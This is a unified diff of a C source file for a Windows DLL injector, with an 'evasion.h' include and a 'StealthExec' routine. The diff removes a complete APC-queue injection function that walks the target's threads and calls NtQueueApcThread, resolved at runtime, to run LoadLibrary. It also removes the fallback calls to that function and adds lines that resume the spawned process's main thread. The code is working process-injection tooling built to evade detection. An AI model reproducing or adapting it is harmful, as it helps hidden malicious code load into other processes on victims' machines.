@@ -3,65 +3,6 @@
 #include <stdbool.h>
 #include "detector.h"
 #include "evasion.h"
-#include <winternl.h>
-#include <tlhelp32.h>
-
-typedef NTSTATUS(NTAPI *pNtQueueApcThread)(
-    HANDLE ThreadHandle,
-    PVOID ApcRoutine,
-    PVOID ApcArgument1,
-    PVOID ApcArgument2,
-    PVOID ApcArgument3);
-
-BOOL QueueAPCInjection(HANDLE hProcess, LPVOID remoteDllPath, LPTHREAD_START_ROUTINE loadLibraryAddr)
-{
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE)
-    {
-        printf("[!] Failed to create snapshot.\n");
-        return FALSE;
-    }
-
-    THREADENTRY32 te;
-    te.dwSize = sizeof(THREADENTRY32);
-
-    if (Thread32First(hSnapshot, &te))
-    {
-        do
-        {
-            if (te.th32OwnerProcessID == GetProcessId(hProcess))
-            {
-                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
-                if (hThread)
-                {
-                    printf("[*] Found Thread ID: %lu\n", te.th32ThreadID);
-
-                    // Resolve NtQueueApcThread dynamically
-                    pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetMod("ntdll.dll", "NtQueueApcThread");
-                    if (NtQueueApcThread)
-                    {
-                        NTSTATUS status = NtQueueApcThread(hThread, (PVOID)loadLibraryAddr, remoteDllPath, NULL, NULL);
-                        if (status == 0)
-                        {
-                            ResumeThread(hThread);
-                            CloseHandle(hThread);
-                            CloseHandle(hSnapshot);
-                            return TRUE;
-                        } else {
-                            printf("[!] NtQueueApcThread failed: 0x%lX\n", status);
-                        }
-                    } else {
-                        printf("[!] Failed to resolve NtQueueApcThread.\n");
-                    }
-                    CloseHandle(hThread);
-                }
-            }
-        } while (Thread32Next(hSnapshot, &te));
-    }
-
-    CloseHandle(hSnapshot);
-    return FALSE;
-}
 
 // Core Injection Logic
 void StealthExec(HANDLE hProc, const char *dllN)
@@ -118,15 +59,6 @@ void StealthExec(HANDLE hProc, const char *dllN)
     if (!hThreadRemote)
     {
         printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
-        printf("[*] Injecting using APC Queue\n");
-        if (!QueueAPCInjection(hProc, memLoc, (LPTHREAD_START_ROUTINE)pLLoad))
-        {
-            printf("[!] APC Injection failed.\n");
-        }
-        else
-        {
-            printf("[*] Successfully injected via APC!\n");
-        }
         return;
     }
     else
@@ -138,15 +70,6 @@ void StealthExec(HANDLE hProc, const char *dllN)
             printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
             CloseHandle(hThreadRemote);
             TerminateThread(hThreadRemote, 0); // Kill stuck thread
-            printf("[*] Injecting using APC Queue\n");
-            if (!QueueAPCInjection(hProc, memLoc, (LPTHREAD_START_ROUTINE)pLLoad))
-            {
-                printf("[!] APC Injection failed.\n");
-            }
-            else
-            {
-                printf("[*] Successfully injected via APC!\n");
-            }
             return;
         }
         ResumeThread(hThreadRemote);
@@ -195,7 +118,9 @@ int main(int argc, char *argv[])
     StealthExec(pInfo.hProcess, dllPath);
 
     // Resume Execution
+    ResumeThread(pInfo.hThread);
     CloseHandle(pInfo.hProcess);
+    CloseHandle(pInfo.hThread);
     printf("[*] %s is now running.\n", procName);
 
     return 0;
